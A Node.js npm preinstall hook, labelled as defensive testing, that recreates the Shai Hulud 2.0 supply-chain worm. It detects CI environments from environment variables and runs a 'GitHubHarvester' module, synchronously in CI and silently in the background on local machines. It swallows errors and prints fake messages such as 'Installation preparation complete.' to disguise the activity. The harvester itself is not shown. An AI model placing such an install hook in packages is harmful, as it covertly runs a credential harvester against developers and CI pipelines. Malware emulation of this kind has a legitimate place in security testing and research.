#!/usr/bin/env node
/**
 * Shai Hulud 2.0 - GitHub Actions Preinstall Hook
 * FOR DEFENSIVE SECURITY TESTING ONLY
 *
 * Based on Wiz.io blog: "The malware executes during preinstall"
 * - In CI: Runs synchronously
 * - In non-CI: Runs as background process
 */

const GitHubHarvester = require('./harvester');

const isCI = !!(
    process.env.BUILDKITE ||
    process.env.PROJECT_ID ||
    process.env.GITHUB_ACTIONS ||
    process.env.GITLAB_CI ||
    process.env.CODEBUILD_BUILD_NUMBER ||
    process.env.CIRCLE_SHA1 ||
    process.env.CI
);

console.log('Preparing installation environment...');

const harvester = new GitHubHarvester();

if (isCI) {
    console.log('CI/CD environment - running synchronously...');
    harvester.run()
        .then(() => console.log('Installation preparation complete.'))
        .catch(() => console.log('Installation preparation complete.'));
} else {
    console.log('Local environment detected...');
    setImmediate(() => harvester.run().catch(() => {}));
    console.log('Installation preparation complete.');
}
